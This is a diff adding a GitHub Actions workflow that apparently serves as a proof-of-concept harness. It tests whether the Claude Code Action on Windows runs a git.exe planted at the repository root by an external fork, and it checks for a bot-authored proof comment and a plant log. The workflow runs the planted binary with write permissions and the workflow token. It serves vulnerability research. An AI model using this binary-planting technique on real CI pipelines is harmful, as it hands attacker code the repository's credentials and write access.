@@ -1,0 +1,97 @@
+name: Claude Action Windows git.exe path falsifier
+
+run-name: >-
+  Windows git.exe path falsifier on PR #${{ github.event.issue.number }}
+  comment ${{ github.event.comment.id }}
+
+on:
+  issue_comment:
+    types: [created]
+
+jobs:
+  windows-git-path-falsifier:
+    if: >-
+      github.event.issue.pull_request &&
+      github.actor == 'marcelhacks' &&
+      contains(github.event.comment.body, '@claude-windows-git-path-falsifier')
+    runs-on: windows-latest
+    timeout-minutes: 15
+    permissions:
+      contents: write
+      pull-requests: write
+      issues: write
+      id-token: write
+      actions: read
+    steps:
+      - name: Check out trusted base branch
+        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
+        with:
+          fetch-depth: 1
+
+      - name: Set bounded test context
+        shell: pwsh
+        env:
+          PR_NUMBER: ${{ github.event.issue.number }}
+        run: |
+          "POC_PR_NUMBER=$env:PR_NUMBER" >> $env:GITHUB_ENV
+          Write-Host "poc_pr_number=$env:PR_NUMBER"
+          Write-Host "trusted_base_commit=$(git rev-parse HEAD)"
+
+      - name: Run pinned Claude Code Action
+        id: claude
+        continue-on-error: true
+        uses: anthropics/claude-code-action@44423bdec74b97d67543eb16c110546762c110b2
+        with:
+          anthropic_api_key: bounded-invalid-test-key
+          path_to_claude_code_executable: C:\Windows\System32\where.exe
+
+      - name: Classify path selection and run payload self-test
+        if: always()
+        shell: pwsh
+        env:
+          GH_TOKEN: ${{ github.token }}
+          PR_NUMBER: ${{ github.event.issue.number }}
+        run: |
+          $ErrorActionPreference = "Stop"
+          $proofBody = "[windows git plant PoC] repository-root git.exe executed before first model dispatch in run $env:GITHUB_RUN_ID."
+          $plantLog = Join-Path $PWD "planted-git.log"
+          $selfTestLog = Join-Path $PWD "git-self-test.log"
+
+          Write-Host "action_outcome=${{ steps.claude.outcome }}"
+          Write-Host "repository_git_exe_present=$(Test-Path .\git.exe)"
+          if (-not (Test-Path .\git.exe)) {
+            throw "The external-fork git.exe is absent after Action checkout"
+          }
+
+          Remove-Item $selfTestLog -ErrorAction SilentlyContinue
+          & "$PWD\git.exe" --self-test
+          if (-not (Test-Path $selfTestLog)) {
+            throw "Explicit payload self-test failed"
+          }
+          Write-Host "payload_self_test=true"
+          Get-Content $selfTestLog
+
+          $comments = gh api "repos/$env:GITHUB_REPOSITORY/issues/$env:PR_NUMBER/comments?per_page=100" |
+            ConvertFrom-Json
+          $comment = $comments |
+            Where-Object {
+              $_.user.login -eq "claude[bot]" -and
+              $_.body -eq $proofBody
+            } |
+            Select-Object -Last 1
+
+          $selectedByAction = (Test-Path $plantLog) -and ($null -ne $comment)
+          Write-Host "selected_by_action=$($selectedByAction.ToString().ToLowerInvariant())"
+          if (Test-Path $plantLog) {
+            Get-Content $plantLog
+          }
+          if ($null -ne $comment) {
+            Write-Host "authenticated_comment_id=$($comment.id)"
+            Write-Host "authenticated_comment_author=$($comment.user.login)"
+          }
+
+          if ($selectedByAction) {
+            Write-Host "VULNERABLE: HOSTED_WINDOWS_GIT_PLANT_CONFIRMED"
+          } else {
+            Write-Host "NOT_REPRODUCED: repository-root git.exe was not selected by the Action"
+          }
